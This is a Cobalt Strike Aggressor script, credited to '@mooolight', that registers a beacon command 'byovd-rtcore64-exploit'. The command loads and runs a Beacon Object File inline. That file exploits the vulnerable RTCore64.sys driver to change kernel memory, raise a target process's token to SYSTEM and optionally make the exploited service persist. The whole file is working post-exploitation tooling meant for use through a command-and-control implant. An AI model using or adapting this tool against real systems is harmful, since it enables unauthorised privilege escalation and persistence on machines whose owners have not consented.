# author @mooolight

beacon_command_register(
	"byovd-rtcore64-exploit", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.",
	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.\n\n" .
	"ARGUMENTS:\n[<action>]: Action to take after the exploitation phase.\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Status whether the exploited service will persist or not.\n\n" .
	"USAGE:\nbyovd-rtcore64-exploit <action> <targetProc>\n\n".
	"EXAMPLES:\nbyovd-rtcore64-exploit elevate2system 8917 TRUE\n\n");

alias byovd-rtcore64-exploit {
    $bid = $1;
    $action = $2;
	$targetProc = $3;
    $pers = $4;

    if ($action eq "") {
        berror($bid, "Please specify the action to take upon deploying the exploit.\n");
        return;
    }
	if ($targetProc eq "") {
        berror($bid, "Please specify the target process to modify either the elevation or token privilege(s).\n");
        return;
    }
    if ($pers eq "") {
        berror($bid, "Please specify whether the exploited service will persist or not.\n");
        return;
    }
	
    # Read in the right BOF file
    $handle = openf(script_resource("byovd-rtcore64-exploit-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid, "zzz", $action, $targetProc,$pers);

    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}
